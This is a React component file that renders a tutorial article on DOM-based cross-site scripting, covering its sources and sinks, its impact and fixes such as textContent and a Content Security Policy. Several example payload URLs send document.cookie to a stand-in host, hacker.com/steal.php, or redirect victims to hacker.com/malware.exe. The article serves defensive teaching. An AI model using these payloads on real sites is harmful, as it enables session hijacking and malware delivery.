
import CodeBlock from "./CodeBlock";
import "./article.css"
import ScrollToTop from "../scrollToTop/scrollToTop";

import Header from "./shared/header"
import Auther from "./shared/auther"
import Aside from "./shared/aside"
import ArticlePart from "./shared/articlePart"
import Footer from "./shared/footer"


export default function XSS() {
  return (
    <>
      <ScrollToTop/> {/* Scroll To Top Button */}
      <Header articleName="DOM XSS" LabName="Dom XSS Labs"/>
      <Auther autherName="Waleed Sameer" readTime="5" imageSrc="/imgs/hacker.png"><span>DOM</span> <span>C</span>ross <span>S</span>ite <span>S</span>cripting</Auther>
      <Aside/>
      <ArticleContent/>
    </>
  )
}

function ArticleContent() {
  return (
      <>
        <article>
          <ArticlePart className="bug-definition">
          <h4>1. What's The DOM-XSS Vulnerability ?</h4>
          <div>
            <p>
              DOM-based Cross-Site Scripting (DOM XSS) is a <b>client-side XSS vulnerability</b>
              <br/>
              where malicious JavaScript is injected and executed entirely in the browser, without the server modifying its response.
              <br/>
              <br/>
              Unlike Stored XSS and Reflected XSS, which rely on server-side injection.
              <br/>
              <b>DOM XSS occurs when JavaScript in the client-side dynamically processes untrusted user input without proper sanitization.</b> 
              <br/>
              <br/>
              These scripts are then <b>executed in the victim's browser</b> , leading to: 
            </p> 
            <ul>
              <li><b>Stealing sensitive information</b> (cookies, session tokens).</li>
              <li><b>Defacing websites or modifying their behavior.</b></li>
              <li><b>Performing unauthorized actions on behalf of users.</b></li>
            </ul>
            <p>Example in simple terms: for instance, If the developer Used 
              <span className={"highlighted"}>location.hash</span> to create a function to scroll to it, then we can exploit this mistake with :</p>
  <CodeBlock language={"url"} code={`https://example.com/#<script>alert(document.cookie)</script>;`}/>

            <p><b>and it pops up an alert, Then it's XSS!</b> </p>
          </div>
          </ArticlePart>
          <ArticlePart className="when-happens">
          <h4>2. When Does DOM-XSS Happen?</h4>
          <div>
              <p><b>DOM XSS occurs when JavaScript reads untrusted user input from sources</b> like :</p>
            <ul>
              <li> <b>Manipulating query parameters,</b> For instance :
              <CodeBlock language={"js"} code={`document.URL`}/>
              </li>
              <li><b>Modifying URL fragments, </b>For instance : 
              <CodeBlock language={"js"} code={`window.location.hash\nwindow.location.pathname`}/>
              </li>
              <li><b>Injecting raw HTML content into the page, </b>For Instance :
              <CodeBlock language={"js"} code={`document.links[0].innerHTML || document.links[0].outerHTML`} />
              </li>
              <li><b>Using functions Allows content injection, </b> as Example :
              <CodeBlock language={"js"} code={`document.write()\nwindow.eval()`}/>
              </li>
              <li><b>In some cases Using Web storage to Exploiting stored data,</b> as Example :
              <CodeBlock language={"js"} code={`window.localStorage || window.sessionStorage`} />
              </li>
            </ul>
          </div>
          </ArticlePart>
          <ArticlePart className="risks-impact" >
            <h4>3. What're The Risks and Impact of DOM-XSS ?</h4>
            <div>
              <p>
                Since <b>DOM XSS occurs entirely in the browser</b>, it can bypass traditional server-side security controls. <br/>
                <br/>
                <b>The risks include:</b>
                <br/>
              </p>
              <ul>
                <li>
                  <b>Account Takeovers</b>, Stealing session cookies to hijack user accounts.
                  <br/> 
                  - In case , the Developer used innerHTML function to deal with user Input Like : 
                  <CodeBlock language={"js"} code={`document.getElementById("search-box").innerHTML = "search of, " + window.location.search.split('=')[1];`}/>
                - <b>Now, Attackers Can craft Malicious Links based on this Vulnerable Function</b>, Like this 
                <CodeBlock language={"url"} code={`https://example.com?search=<script>document.location = \`https//hacker.com/steal.php?cookie=\${document.cookie}\`</script>`}/>
                </li>
                <li><b>Phishing Attacks</b> - Injecting fake login forms to steal credentials.</li>
                <li><b>Defacing Websites</b> - Altering the content of a webpage.</li>
                <li><b>Spreading Malware</b> - Injecting malicious scripts to download trojans.</li>
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="real-exploitation">
            <h4>4. What're Real Scenarios and Exploitation Examples ?</h4>
            <div>
              <ul>
                <li><b>Stealing Cookies</b> 
                <CodeBlock language={"url"} code={`https://vulnerable.com/#<script>document.location=\`http://hacker.com/steal.php?cookie=\${document.cookie}&userAgent=\${navigator.userAgent}\` </script>`}/>
                This sends the victim’s cookies to an attacker-controlled server. 
                </li>
                <li>
                  <b>Injecting Malicious Links</b> to download trojans!
                  <CodeBlock language={"url"} code={`https://vulnerable.com/#<script>document.location=\`http://hacker.com/malware.exe\` </script>`}/>
                </li>
                <li>
                  <b>and, a lot of Exploitation based of evil thoughts of the Attacker </b>
                </li>
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="fix-prevent">
            <h4>5. How to Fix & Secure Your Website ?</h4>
            <div>
              <ul>
                <li>
                  <b>Use Safe DOM Manipulation Methods, Like </b>
                  <CodeBlock language={"js"} code={`document.links[0].textContent = "Save Text" // This\n\ndocument.links[0].innerText = "Save Text" // Or This`}/>
                </li>
                <br/>
                <li>
                  <b>Avoid Dangerous Functions, and Never Use their with untrusted data!</b>
                  <br/>
                  <br/>
                  <CodeBlock language={"js"} code={`window.eval()\n\ndocument.write()\n\nelement.innerHTML`}/>
                </li>
                <br/>
                <br/>
                <li>
                  <b>Set a Strong Content Security Policy (CSP), by Set CSP headers to restrict scripts </b>
                  <br/>
                  <CodeBlock language={"http"} code={`Content-Security-Policy: default-src 'self'; script-src 'self';`}/>
                  <br/>
                </li>
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="conclusion-resources">
            <h4>- The Conclusion & Additional Resources</h4>
            <div>
              <h3>The Conclusion</h3>
              <br/>
              DOM XSS is particularly <b>dangerous because it bypasses server-side protections</b> and relies solely on insecure JavaScript.
              <br/>
              Whether you're a <b>web developer</b> trying to secure your web app or a <b>bug hunter</b> looking for vulnerabilities,
              understanding DOM-XSS Vulnerability is essential in web security.
              <br/>
              <br/>
            <h3>Additional Resources</h3>
              <br/>
              <ul>
                <li>
                  <b>
                    <a href="https://portswigger.net/web-security/all-labs#cross-site-scripting" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >Portswigger XSS Labs</a>
                    </b>
                </li>
                <li>
                  <b>
                    <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >OWASP XSS Cheat Sheet</a>
                    </b>
                </li>
                <li>
                  <b>
                    <a href="https://xss-game.appspot.com/" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >Google XSS Game</a>
                    </b>
                </li>
                <li>
                  <b>
                    <a href="https://www.google.com/search?q=bug+bounty+reports+on+xss+intitle+medium" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >Bug Bounty Reports</a>
                    </b>
                </li>
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="good-bye">
          <h4>🟡 Last but not Least!</h4>
          <div>
            <p style={{fontWeight: "bold"}}>"Think like an attacker, defend like a guardian! The best security expert is the one who never stops learning! "</p>
            <br/>
            <p style={{color: "var(--main-color)", fontFamily: 'heading-font',fontWeight: "bold"}}>
              <a href="https://facebook.com/fandeta7"
              target="_blank"
              style={{color: "var(--main-color)", textDecoration: "underline"}}>Fandeta</a> was here!</p>
          </div>
          </ArticlePart>
        </article>
        <Footer/>
      </>
  )
}